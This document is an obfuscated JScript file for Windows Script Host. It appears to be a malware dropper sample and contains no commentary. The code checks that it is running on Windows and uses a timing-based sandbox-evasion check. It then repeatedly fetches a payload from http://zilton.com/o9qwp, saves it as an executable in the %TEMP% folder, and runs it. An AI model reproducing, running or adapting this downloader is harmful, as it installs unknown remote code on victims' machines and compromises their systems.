var yY = false;
var sQ = "CreateObject";
var qx = function l() {return WScript[sQ]("WScript.Shell");}(), c = 11;
var g = "MSXML2.XMLHTTP";
var pz = 2123213;
var Zq = 0;
function El(En){qx["Run"](En, Zq, Zq);};
function V(){return "" + g;};
function pT(J, D){Zq = Zq * 1; return J - D;};
function qa(){return sQ;};
/*@cc_on
  @if (@_win32 || @_win64)
    yY = true;
  @end
@*/
if (yY)
{
var o = "";
function Hy(){return 22;};
var xU = 0; var g0 = 0;
function A()
{
var QU = new this["Date"]();
var gr = QU["getUTCMilliseconds"]();
WScript["Sleep"](Hy());
var QU = new this["Date"]();
var z = QU["getUTCMilliseconds"]();
WScript["Sleep"](Hy());
var QU = new this["Date"]();
var s0 = QU["getUTCMilliseconds"]();
var xU = "h";
xU = pT(z, gr);
var g0 = "U";
g0 = pT(s0, z);
o = "open";
return pT(xU, g0);
}
var ra = false;
var hY = false;
for (var y = Zq; y < Hy() * 1; y++){if (A() != Zq){
ra = true; 
g0 = "31" + 11 * xU + g0; 
hY = true; 
break;
}}
function QS() {return ((ra == true) && (ra == hY)) ? 1 : Zq;};
if (ra && QS() && hY){
function Bv() {return qx["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "tGiABbfZP.exe";};
 s1 = V();
 tN = WScript[sQ](s1);
 var Mk = 1;
 while (Mk){
try {
tN[o]("GET", "http://zilton.com/o9qwp", false);
tN["send"]();
Cl = "Sleep";
for (;;){WScript[Cl](Hy() * 11); if (tN["readystate"] >= 2 * 2) break;};
Mk = Zq;
} catch(SU){};
}
function PS(s) {var E = (1, 2, 3, 4, 5, s); return E;};
Sk = WScript[qa()]("ADODB.Stream");
s1 = Sk;
s1[o]();
s1["type"] = PS(1);
s1["write"](tN["ResponseBody"]);
Sk["position"] = PS(Zq);
s1["Save" + "ToFile"](Bv(), 2);
Sk["c"+"lose"]();
BN = Bv();
El(BN);
}
}

